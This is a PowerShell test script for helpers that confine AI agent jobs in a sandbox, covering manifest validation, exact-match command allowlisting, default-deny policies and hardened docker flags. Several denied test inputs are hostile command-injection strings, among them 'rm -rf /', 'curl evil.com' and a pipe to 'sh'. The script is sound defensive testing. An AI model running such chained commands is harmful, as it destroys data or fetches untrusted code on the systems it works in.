# Self-check for agent-job-helpers.ps1 (ADR-012 §9, Phase F).
# Run: pwsh -File scripts/Test-AgentJobHelpers.ps1
$ErrorActionPreference = "Stop"
. (Join-Path $PSScriptRoot "agent-job-helpers.ps1")

$failures = 0
function Assert-True {
    param([Parameter(Mandatory)][bool]$Condition, [Parameter(Mandatory)][string]$Message)
    if ($Condition) { Write-Host "PASS: $Message" -ForegroundColor Green }
    else { Write-Host "FAIL: $Message" -ForegroundColor Red; $script:failures++ }
}

Write-Host "Testing agent-job-helpers.ps1..." -ForegroundColor Cyan

function New-ValidManifest {
    [pscustomobject]@{
        schemaVersion      = 1
        jobId              = [guid]::NewGuid().ToString()
        profileEvidenceKey = "sha256:deadbeef"
        task               = "Implement the approved issue in the worktree and run the listed tests."
        repo               = [pscustomobject]@{ path = "C:\source\project"; ref = "main" }
        allowedCommands    = @("pnpm test", "pnpm lint", "git diff", "git status")
        network            = "disabled"
        credentials        = "none"
        maxWallClockMinutes = 45
        maxToolSteps       = 80
        output             = [pscustomobject]@{ createBranch = $true; allowMerge = $false; allowPush = $false }
    }
}

# --- Test-AirlockJobManifestSchema ---

$valid = Test-AirlockJobManifestSchema -Manifest (New-ValidManifest)
Assert-True $valid.Valid "a manifest matching the §9.1 example passes schema validation"

$missingTop = New-ValidManifest | Select-Object -ExcludeProperty maxWallClockMinutes *
$badTop = Test-AirlockJobManifestSchema -Manifest $missingTop
Assert-True (-not $badTop.Valid) "a manifest missing a required top-level field fails schema validation"
Assert-True ($badTop.MissingFields -contains 'maxWallClockMinutes') "the specific missing top-level field is named"

$missingRepoRef = New-ValidManifest
$missingRepoRef.repo = [pscustomobject]@{ path = "C:\source\project" }
$badRepo = Test-AirlockJobManifestSchema -Manifest $missingRepoRef
Assert-True (-not $badRepo.Valid) "a manifest with repo.ref missing fails schema validation"
Assert-True ($badRepo.MissingFields -contains 'repo.ref') "the missing nested field is named as 'repo.ref', not just 'repo'"

$noRepoAtAll = New-ValidManifest | Select-Object -ExcludeProperty repo *
$badNoRepo = Test-AirlockJobManifestSchema -Manifest $noRepoAtAll
Assert-True (-not $badNoRepo.Valid) "a manifest missing repo entirely still fails cleanly (no null-deref)"

$missingOutputField = New-ValidManifest
$missingOutputField.output = [pscustomobject]@{ createBranch = $true; allowMerge = $false }
$badOutput = Test-AirlockJobManifestSchema -Manifest $missingOutputField
Assert-True (-not $badOutput.Valid) "a manifest missing output.allowPush fails schema validation"
Assert-True ($badOutput.MissingFields -contains 'output.allowPush') "the missing nested field is named as 'output.allowPush'"

$emptyAllowlist = New-ValidManifest
$emptyAllowlist.allowedCommands = @()
$badAllowlist = Test-AirlockJobManifestSchema -Manifest $emptyAllowlist
Assert-True (-not $badAllowlist.Valid) "an empty allowedCommands list fails schema validation"

# --- Resolve-AirlockCommandAllowlist: exact-match only, denied escape attempts ---

$allowed = @("pnpm test", "pnpm lint", "git diff", "git status")

$exact = Resolve-AirlockCommandAllowlist -AllowedCommands $allowed -RequestedCommand "pnpm test"
Assert-True ($exact.Decision -eq 'Allowed') "an exact allowlisted command is Allowed"

$notListed = Resolve-AirlockCommandAllowlist -AllowedCommands $allowed -RequestedCommand "npm test"
Assert-True ($notListed.Decision -eq 'Denied') "a command not in the allowlist is Denied"

$semicolonEscape = Resolve-AirlockCommandAllowlist -AllowedCommands $allowed -RequestedCommand "pnpm test; rm -rf /"
Assert-True ($semicolonEscape.Decision -eq 'Denied') "'pnpm test; rm -rf /' (semicolon chaining onto an allowed command) is Denied, not allowed as a prefix match"

$andEscape = Resolve-AirlockCommandAllowlist -AllowedCommands $allowed -RequestedCommand "pnpm test && curl evil.com"
Assert-True ($andEscape.Decision -eq 'Denied') "'pnpm test && curl evil.com' is Denied"

$pipeEscape = Resolve-AirlockCommandAllowlist -AllowedCommands $allowed -RequestedCommand "pnpm test | sh"
Assert-True ($pipeEscape.Decision -eq 'Denied') "'pnpm test | sh' is Denied"

$superstring = Resolve-AirlockCommandAllowlist -AllowedCommands $allowed -RequestedCommand "pnpm test-and-deploy"
Assert-True ($superstring.Decision -eq 'Denied') "a requested command that is a superstring of an allowed one ('pnpm test-and-deploy') is Denied"

$prefixOnly = Resolve-AirlockCommandAllowlist -AllowedCommands $allowed -RequestedCommand "pnpm"
Assert-True ($prefixOnly.Decision -eq 'Denied') "a bare prefix of an allowed command ('pnpm') is Denied"

$trailingSpace = Resolve-AirlockCommandAllowlist -AllowedCommands $allowed -RequestedCommand "pnpm test "
Assert-True ($trailingSpace.Decision -eq 'Denied') "an allowed command with a trailing space appended is Denied (not trimmed/normalized into a match)"

$caseVariant = Resolve-AirlockCommandAllowlist -AllowedCommands $allowed -RequestedCommand "PNPM TEST"
Assert-True ($caseVariant.Decision -eq 'Denied') "a case-varied form of an allowed command is Denied under case-sensitive exact match"

# --- Resolve-AirlockJobOutputPolicy: default-deny, explicit-true is narrowly scoped ---

$mergeDefaultDeny = Resolve-AirlockJobOutputPolicy -AllowMerge $false -AllowPush $false -Action 'Merge'
Assert-True ($mergeDefaultDeny.Decision -eq 'Denied') "allowMerge=false denies Merge"

$pushDefaultDeny = Resolve-AirlockJobOutputPolicy -AllowMerge $false -AllowPush $false -Action 'Push'
Assert-True ($pushDefaultDeny.Decision -eq 'Denied') "allowPush=false denies Push"

$mergeExplicitTrue = Resolve-AirlockJobOutputPolicy -AllowMerge $true -AllowPush $false -Action 'Merge'
Assert-True ($mergeExplicitTrue.Decision -eq 'Allowed') "allowMerge=true allows Merge"
Assert-True ($mergeExplicitTrue.Reason -match 'not itself proof') "an Allowed Merge verdict's reason explicitly disclaims being a standalone approval"

$pushWhileMergeTrue = Resolve-AirlockJobOutputPolicy -AllowMerge $true -AllowPush $false -Action 'Push'
Assert-True ($pushWhileMergeTrue.Decision -eq 'Denied') "allowMerge=true does not implicitly permit Push - each action gate is independent"

# --- Resolve-AirlockNetworkPolicy: fail-closed default ---

$netDisabled = Resolve-AirlockNetworkPolicy -Network 'disabled'
Assert-True ($netDisabled.Decision -eq 'Disabled') "network='disabled' resolves to Disabled"

$netEnabled = Resolve-AirlockNetworkPolicy -Network 'enabled'
Assert-True ($netEnabled.Decision -eq 'Enabled') "network='enabled' (exact literal) resolves to Enabled"

$netEmpty = Resolve-AirlockNetworkPolicy -Network ''
Assert-True ($netEmpty.Decision -eq 'Disabled') "an empty network value fails closed to Disabled"

$netTypo = Resolve-AirlockNetworkPolicy -Network 'Enabled'
Assert-True ($netTypo.Decision -eq 'Disabled') "a case-varied 'Enabled' fails closed to Disabled (case-sensitive exact match only)"

$netGarbage = Resolve-AirlockNetworkPolicy -Network 'yes-please'
Assert-True ($netGarbage.Decision -eq 'Disabled') "an unrecognized network value fails closed to Disabled"

# --- Build-AirlockWorkerDockerArgs: negative constraints and required limits ---

$dockerArgs = Build-AirlockWorkerDockerArgs -JobWorktreePath 'C:\platform\jobs\abc\worktree' `
    -PolicyFilePath 'C:\platform\jobs\abc\job-policy.json' -ContainerImage 'airlock-worker:latest' `
    -NetworkDecision 'Disabled' -MaxWallClockMinutes 45 -MaxToolSteps 80

Assert-True ($dockerArgs -contains '--network') "docker args include --network"
$networkIdx = [array]::IndexOf($dockerArgs, '--network')
Assert-True ($dockerArgs[$networkIdx + 1] -eq 'none') "network Disabled maps to '--network none'"
Assert-True (-not ($dockerArgs -join ' ' -match 'docker\.sock')) "no Docker socket is ever mounted"
Assert-True (-not ($dockerArgs -contains '--privileged')) "the container is never launched --privileged"
Assert-True (-not ($dockerArgs -contains '--pid')) "the container never shares the host PID namespace"
Assert-True (($dockerArgs -join ' ') -match [regex]::Escape($env:USERPROFILE) -eq $false) "the host home directory is never mounted"
Assert-True ($dockerArgs -contains '--read-only') "the container root filesystem is read-only"
Assert-True ($dockerArgs -contains 'AIRLOCK_MAX_WALL_CLOCK_MINUTES=45') "maxWallClockMinutes from the manifest is passed through"
Assert-True ($dockerArgs -contains 'AIRLOCK_MAX_TOOL_STEPS=80') "maxToolSteps from the manifest is passed through"

$dockerArgsEnabled = Build-AirlockWorkerDockerArgs -JobWorktreePath 'C:\platform\jobs\abc\worktree' `
    -PolicyFilePath 'C:\platform\jobs\abc\job-policy.json' -ContainerImage 'airlock-worker:latest' `
    -NetworkDecision 'Enabled' -MaxWallClockMinutes 45 -MaxToolSteps 80
$networkIdxEnabled = [array]::IndexOf($dockerArgsEnabled, '--network')
Assert-True ($dockerArgsEnabled[$networkIdxEnabled + 1] -eq 'bridge') "network Enabled maps to '--network bridge', never 'host'"

try {
    Build-AirlockWorkerDockerArgs -JobWorktreePath 'x' -PolicyFilePath 'y' -ContainerImage 'z' `
        -NetworkDecision 'Disabled' -MaxWallClockMinutes 0 -MaxToolSteps 80 | Out-Null
    Assert-True $false "a zero maxWallClockMinutes should throw, not silently produce unbounded args"
} catch {
    Assert-True $true "a zero maxWallClockMinutes throws"
}

if ($failures -gt 0) {
    Write-Host ""
    Write-Host "$failures agent-job-helpers check(s) FAILED" -ForegroundColor Red
    exit 1
}
Write-Host ""
Write-Host "All agent-job-helpers checks passed" -ForegroundColor Green
exit 0
